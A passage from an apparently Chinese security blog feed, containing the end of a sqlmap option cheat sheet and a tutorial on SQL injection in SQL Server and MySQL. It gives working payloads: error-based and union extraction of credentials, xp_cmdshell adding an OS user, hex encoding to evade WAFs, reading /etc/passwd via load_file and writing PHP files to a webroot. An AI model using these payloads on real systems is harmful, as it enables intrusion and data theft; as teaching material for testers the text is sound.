class="line-numbers language-none"><code class="language-none">-d &quot;mysql:&#x2F;&#x2F;username:password@IP:PORT&#x2F;db_name&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>注入等级:</p><pre class="line-numbers language-none"><code class="language-none">--level 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将注入语句插入到指定位置:</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;www.secbug.com&#x2F;id&#x2F;2*.html&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用-r参数对HTTP请求注入时，也可以直接在文本中插入*号：</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;login.php HTTP&#x2F;1.1Host: www.secbug.comUser-Agent: Mozilla&#x2F;5.0        username&#x3D;admin*&amp;password&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用SQLMAP插件:</p><pre class="line-numbers language-none"><code class="language-none">--tamper &quot;space2morehash.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：对注入的SQL语句进行编码等操作，通常用来绕WAF(插件保存在SQLMAP目录下的tamper文件夹下)</p></li><li><p>常用SQLMAP参数及说明:</p><pre class="line-numbers language-none"><code class="language-none">-b 获取banner-p 指定测试参数-g 从google中获取URL， -g &quot;inurl:php?id&#x3D;&quot;--gpage&#x3D;3 指定google页码--union-cols 指定union查询的列测试范围--proxy 使用代理--threads 采用多线程--user-agent 自定义user-agent--referer 定义HTTP referer头--string 指定关键词--tor 创建tor的匿名网络--predict-output 常见的查询输出预测--keep-alive 使用持久HTTP(S)连接--eval&#x3D;EVALCODE 使用http参数污染-a 查询所有--hostname 主机名--is-dba 是否是管理员权限--users 枚举所有的用户--passwords 枚举所有的用户密码--roles 枚举所有的用户角色--schema 枚举DBMS模式--count 检索所有的条目数--dump 转存DBMS数据库表项目，需要指定字段名称--dump-all 转存DBMS数据库所有的表项目--search 搜索列、表或数据库名称--exclude-sysdbs 在枚举表时排除系统数据库--sql-query&#x3D; 执行SQL语句--file-read&#x3D;RFILE 读取操作--file-write&#x3D;WFILE 写入操作--file-dest&#x3D;DFILE 绝对路径写入--reg-read 读取一个windows注册表项值--reg-add 增加一个windows注册表项值数据--reg-del 删除一个windows注册表项值数据--reg-key&#x3D;REGKEY windows注册表键--reg-value&#x3D;REGVAL windows注册表键值--reg-data&#x3D;REGDATA windows注册表的键值项数据--reg-type&#x3D;REGTYPE windows注册表键的值类型--dump-format&#x3D;DUMP 转存数据格式(CSV(default)、HTML、SQLite)--hex 在数据检索期间使用16进制转换--output-dir&#x3D;ODIR 自定义输出的目录路径--update 更新SQLMAP--purge-output 安全删除所有内容的输出目录--check-waf 启发式检查WAF&#x2F;IPS&#x2F;IDS保护--os-pwn 反弹shell--cookie&#x3D;COOKIE 指定HTTP Cookie,预登录--random-agent 使用随机选定的User-Agent头--tamper&#x3D;TAMPER 使用SQLMAP插件--level 测试等级（1~5),默认为1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注：SQL注入其他工具：</p><ul><li>Pangolin(穿山甲）</li><li>Havij:<br>  地址：<a href="http://itsecteam.com/products/havij-advanced-sql-injection/">http://itsecteam.com/products/havij-advanced-sql-injection/</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞</title>
      <link href="/2021/12/15/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/12/15/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Sql连接符"><a href="#Sql连接符" class="headerlink" title="Sql连接符"></a>Sql连接符</h2><p>mysql为空格，<br>sql server为+，<br>oracle为||</p><h2 id="注入名词解释"><a href="#注入名词解释" class="headerlink" title="注入名词解释"></a>注入名词解释</h2><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>注入字段在post数据中</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>注入字段在cookie中</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>使用数据库延时特性注入</p><h3 id="搜索注入"><a href="#搜索注入" class="headerlink" title="搜索注入"></a>搜索注入</h3><p>注入处为搜索的地点</p><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>注入字符串需要经过base64加密</p><h2 id="sql数据类型转换函数"><a href="#sql数据类型转换函数" class="headerlink" title="sql数据类型转换函数"></a>sql数据类型转换函数</h2><p>cast(),convert()<br>用法：cast(“aaa” as int) #把字符串aaa转换成int型<br>convert(11,char) #把数字11转换成字符串</p><h2 id="常见数据库注入"><a href="#常见数据库注入" class="headerlink" title="常见数据库注入"></a>常见数据库注入</h2><h3 id="SQL-server-（sql-server支持多语句执行）"><a href="#SQL-server-（sql-server支持多语句执行）" class="headerlink" title="SQL server （sql server支持多语句执行）"></a>SQL server （sql server支持多语句执行）</h3><h4 id="1-利用错误消息提取信息"><a href="#1-利用错误消息提取信息" class="headerlink" title="1.利用错误消息提取信息"></a>1.利用错误消息提取信息</h4><h5 id="使用having子句枚举当前表及列"><a href="#使用having子句枚举当前表及列" class="headerlink" title="使用having子句枚举当前表及列:"></a>使用having子句枚举当前表及列:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：在SQL server中，having子句必须跟随group by子句出现，否则会报错，会报出表名和第一个列名(假设为id)。 </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token keyword">table</span><span class="token punctuation">.</span>id <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：得到表名和第一个列名之后，我们可以利用sql server特性:<br>select了几个列就必须group by 相同的列，<br>由于我们只group by 了一 个id列，所以会报错，<br>报错信息会显示第二个列名，通过该方法，直到无报错，就可以依次获得该表所有的列名。 </p><h5 id="利用数据类型转换错误提取信息"><a href="#利用数据类型转换错误提取信息" class="headerlink" title="利用数据类型转换错误提取信息:"></a>利用数据类型转换错误提取信息:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：由于&gt;号的存在，sql server会把1和后面select语句的结果进行比较，<br>由于1是int型，select语句的结果是字符串(假设该结果是root),就会把root转换成int型再和1比较，<br>在转换过程中就会报错，select语句的结果就会爆出来(也就是root会爆出来)，然后我们就可以构造sql语句获取其他用户： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> username <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用sql server内置数据类型转换函数：<br>convert(data_type,expression)<br>cast(expression as data_type)<br>如果递归获取信息比较麻烦,可以使用for xml path语句将查询的语句生成xml: </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token keyword">convert</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> stuff<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">","</span><span class="token operator">+</span>username<span class="token punctuation">,</span><span class="token string">"|"</span><span class="token operator">+</span>password <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">for</span> xml path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-获取元数据"><a href="#2-获取元数据" class="headerlink" title="2.获取元数据"></a>2.获取元数据</h4><h5 id="获得当前数据库："><a href="#获得当前数据库：" class="headerlink" title="获得当前数据库："></a>获得当前数据库：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="获得当前数据库表："><a href="#获得当前数据库表：" class="headerlink" title="获得当前数据库表："></a>获得当前数据库表：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'db_name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="获得当前数据库列："><a href="#获得当前数据库列：" class="headerlink" title="获得当前数据库列："></a>获得当前数据库列：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'table_name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>注：sql server常见表视图：<br>sys.databases #sql server中所有数据库<br>sys.sql_logins #sql server中所有登录名<br>information_schema.tables #当前用户数据库中的表<br>information_schema.columns #当前用户数据库中的列<br>sys.all_columns #用户定义对象和系统对象的所有列的联合<br>sys.database_principals #数据库中每个权限或列异常权限<br>sys.database_files #存储在数据库中的数据库文件<br>sysobjects #数据库中创建的每个对象(例如约束，日志，以及存储过程)</li></ul><h4 id="3-order-by子句"><a href="#3-order-by子句" class="headerlink" title="3.order by子句"></a>3.order by子句</h4><h5 id="使用order-by子句来获取表的查询列数："><a href="#使用order-by子句来获取表的查询列数：" class="headerlink" title="使用order by子句来获取表的查询列数："></a>使用order by子句来获取表的查询列数：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h4><h5 id="union查询探测列数："><a href="#union查询探测列数：" class="headerlink" title="union查询探测列数："></a>union查询探测列数：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="union查询敏感信息："><a href="#union查询敏感信息：" class="headerlink" title="union查询敏感信息："></a>union查询敏感信息：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'x'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把字符串x替换成sql语句即可查询信息<br>注： 1.union前后所有查询的列数必须相同 2.union前后所有查询的对应列的数据类型必须兼容</p><h4 id="5-无辜的函数"><a href="#5-无辜的函数" class="headerlink" title="5.无辜的函数"></a>5.无辜的函数</h4><p>select suser_name() #返回用户的登录标识名<br>select user_name() #基于指定的标识号返回数据库用户名<br>select db_name() #返回数据库名称<br>select is_member(‘db_owner’) #是否为数据库角色<br>select convert(int,’5’) #数据类型转换</p><h5 id="sql-server常用函数："><a href="#sql-server常用函数：" class="headerlink" title="sql server常用函数："></a>sql server常用函数：</h5><p>stuff #字符串截取函数<br>ascii #取ascii码<br>char #根据ascii码取字符<br>getdate #返回日期<br>count #返回组中的总条数<br>cast #将一种数据类型的表达式显式地转换为另一种数据类型的表达式<br>rand #返回随机值<br>is_srvrolemember #指示SQL server登录名是否为指定服务器角色的成员</p><h4 id="6-危险的存储过程"><a href="#6-危险的存储过程" class="headerlink" title="6.危险的存储过程"></a>6.危险的存储过程</h4><h5 id="存储过程-stored-procedure"><a href="#存储过程-stored-procedure" class="headerlink" title="存储过程(stored procedure):"></a>存储过程(stored procedure):</h5><p>是指在大型数据库系统中为了完成特定功能的一组 Sql“函数”，如：执行系统命令，查看注册表，读取磁盘目录等</p><h5 id="xp-cmdshell-允许用户执行操作系统命令"><a href="#xp-cmdshell-允许用户执行操作系统命令" class="headerlink" title="xp_cmdshell,允许用户执行操作系统命令:"></a>xp_cmdshell,允许用户执行操作系统命令:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'net user test test /add'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：并不是任何数据库用户都可以使用此类存储过程，用户必须持有 control server权限.</p><h5 id="常见的存储过程："><a href="#常见的存储过程：" class="headerlink" title="常见的存储过程："></a>常见的存储过程：</h5><p>sp_addlogin #创建新的SQL server登录，该登录允许用户使用sql server身份验证连接到SQL server实例<br>sp_dropuser #从当前数据库中删除数据库用户<br>xp_enumgroups #提供微软windows本地组列表或在指定的windows域中定义的全局组列表<br>xp_regwrite #写入注册表(未被公布的存储过程)<br>xp_regread #读取注册表<br>xp_regdeletevalue #删除注册表<br>xp_dirtree #读取目录<br>sp_password #更改密码<br>xp_servicecontrol #停止或激活某服务<br>注：任何数据库在使用一些特殊的函数或存储过程时，都需要有特定的权限，否则无法使用。</p><ul><li>Sql server数据库的角色与权限：<br>bulkadmin #角色成员可以运行bulk insert语句<br>dbcreator #角色成员可以创建，更改，删除和还原任何数据库<br>diskadmin #角色成员可以管理磁盘文件<br>processadmin #角色成员可以终止在数据库引擎实例中运行的进程<br>securityadmin #角色成员可以管理登录名及其属性。可以利用grant,deny,revoke服务器级别的权限；还可以利用grant,deny,revoke数据库级别的权限。此外，也可以重置SQL server登录名的密码。<br>serveradmin #角色成员可以更改服务器范围的配置选项和关闭服务器<br>setupadmin #角色成员可以添加和删除链接服务器，并可以执行某些系统存储过程。<br>sysadmin #角色成员可以在数据库引擎中执行任何活动。默认情况下，windows builtin\administrators组(本地管理员组)的所有成员都是sysadmin固定服务器角色的成员</li></ul><h4 id="7-动态执行"><a href="#7-动态执行" class="headerlink" title="7.动态执行"></a>7.动态执行</h4><h5 id="Sql-server支持动态执行语句："><a href="#Sql-server支持动态执行语句：" class="headerlink" title="Sql server支持动态执行语句："></a>Sql server支持动态执行语句：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">用户提交一个字符串来执行<span class="token keyword">sql</span>语句：   <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'select username,password from users'</span><span class="token punctuation">)</span>或<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'selec'</span><span class="token operator">+</span><span class="token string">'t username,password fro'</span><span class="token operator">+</span><span class="token string">'m users'</span><span class="token punctuation">)</span>定义<span class="token number">16</span>进制的<span class="token keyword">sql</span>语句，使<span class="token keyword">exec</span>函数执行：<span class="token keyword">declare</span> <span class="token variable">@query</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">888</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token variable">@query</span><span class="token operator">=</span><span class="token number">0x364646373782</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span>或者<span class="token keyword">declare</span><span class="token comment">/**/</span><span class="token variable">@query</span><span class="token comment">/**/</span><span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">888</span><span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token variable">@query</span><span class="token operator">=</span><span class="token number">0x364747447</span><span class="token comment">/**/</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token variable">@query</span><span class="token punctuation">)</span>注:大部分web应用防火墙<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>都过滤了单引号，使用<span class="token number">16</span>进制方式可以使<span class="token keyword">sql</span>语句不存在单引号，从而可以突破很多防火墙及防注入程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MYSQL-（MYSQL不支持多语句执行）"><a href="#MYSQL-（MYSQL不支持多语句执行）" class="headerlink" title="MYSQL （MYSQL不支持多语句执行）"></a>MYSQL （MYSQL不支持多语句执行）</h3><h4 id="1-mysql中的注释"><a href="#1-mysql中的注释" class="headerlink" title="1.mysql中的注释"></a>1.mysql中的注释</h4><p>#注释从“#”字符到行尾<br>--注释从“--”序列到行尾。使用此注释时，后面需要跟上一个或多个空格.(注：空格、tag都可以）<br>&#x2F;**&#x2F;注释从“&#x2F;*”序列到后面的“*&#x2F;”序列之间的字符<br>注：&#x2F;*!*&#x2F;不是注释,例：<br><code>select id/*!55555,username*/ from users</code><br>&#x2F;*!55555,username*&#x2F;的意思是:如果mysql版本号高于或等于5.55.55，则该语句就会执行。如果!后面不加入版本号，mysql将会直接执行sql语句。</p><h4 id="2-获取元数据-1"><a href="#2-获取元数据-1" class="headerlink" title="2.获取元数据:"></a>2.获取元数据:</h4><p>mysql 5.0及其以上版本提供了information_schema(信息数据库），提供了访问数据库元数据的方式。</p><h5 id="查询用户数据库名称"><a href="#查询用户数据库名称" class="headerlink" title="查询用户数据库名称:"></a>查询用户数据库名称:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="查询当前数据库表"><a href="#查询当前数据库表" class="headerlink" title="查询当前数据库表:"></a>查询当前数据库表:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="查询指定表的所有字段"><a href="#查询指定表的所有字段" class="headerlink" title="查询指定表的所有字段:"></a>查询指定表的所有字段:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-union查询"><a href="#3-union查询" class="headerlink" title="3.union查询:"></a>3.union查询:</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-mysql函数利用"><a href="#4-mysql函数利用" class="headerlink" title="4.mysql函数利用:"></a>4.mysql函数利用:</h4><h5 id="load-file-读文件操作"><a href="#load-file-读文件操作" class="headerlink" title="load_file() #读文件操作"></a>load_file() #读文件操作</h5><p>注：要读取文件的位置必须在服务器上，文件必须为绝对路径，而且用户必须持有FILE权限，文件容量必须小于max_allowed_packet字节（默认为16M，最大为1G）<br>例：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果一些防注入语句不允许单引号的出现，可以使用</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token number">0x2f6574632f706173737764</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来绕过<br>或者使用</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果浏览器返回数据存在乱码，可以使用hex()将字符串转换为16进制数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> hex<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token number">0x2732747448</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="into-outfile-写文件操作"><a href="#into-outfile-写文件操作" class="headerlink" title="into outfile #写文件操作"></a>into outfile #写文件操作</h5><p>注：用户必须持有FILE权限，并且文件必须为绝对路径<br>例：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo(); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'c:\wwwroot\1.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'c:\wwwroot\1.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">0x283483483</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token number">0x238348438438</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="连接字符串："><a href="#连接字符串：" class="headerlink" title="连接字符串："></a>连接字符串：</h5><p>concat()<br>例：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>concat_ws()<br>例：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="常见mysql函数："><a href="#常见mysql函数：" class="headerlink" title="常见mysql函数："></a>常见mysql函数：</h5><p>length #返回字符串长度<br>substring #截取字符串长度<br>ascii #返回ascii码<br>hex #把字符串转换为16进制<br>now #当前系统时间<br>unhex #hex的反向操作<br>floor(x) #返回小于等于x的最大整数值<br>md5 #返回md5值<br>group_concat #返回带有来自一个组的连接的非null值的字符串结果<br>@@datadir #读取数据库路径<br>@@basedir #MYSQL安装路径<br>@@version_compile_os #操作系统<br>user #用户名<br>current_user #当前用户名<br>system_user #系统用户名<br>database #数据库名<br>version #MYSQL数据库版本<br>注：使用这些函数都需要有相应的权限</p><h5 id="mysql函数的权限："><a href="#mysql函数的权限：" class="headerlink" title="mysql函数的权限："></a>mysql函数的权限：</h5><table><thead><tr><th align="center">权限</th><th align="center">权限级别</th><th align="center">权限说明</th></tr></thead><tbody><tr><td align="center">create</td><td align="center">数据库、表或索引</td><td align="center">创建数据库、表或索引权限</td></tr><tr><td align="center">drop</td><td align="center">数据库或表</td><td align="center">删除数据库或表权限</td></tr><tr><td align="center">grant option</td><td align="center">数据库、表或保存的程序</td><td align="center">赋予权限选项</td></tr><tr><td align="center">alter</td><td align="center">表</td><td align="center">更改表，比如添加字段</td></tr><tr><td align="center">delete</td><td align="center">表</td><td align="center">删除数据权限</td></tr><tr><td align="center">index</td><td align="center">表</td><td align="center">索引权限</td></tr><tr><td align="center">insert</td><td align="center">表</td><td align="center">插入数据权限</td></tr><tr><td align="center">select</td><td align="center">表</td><td 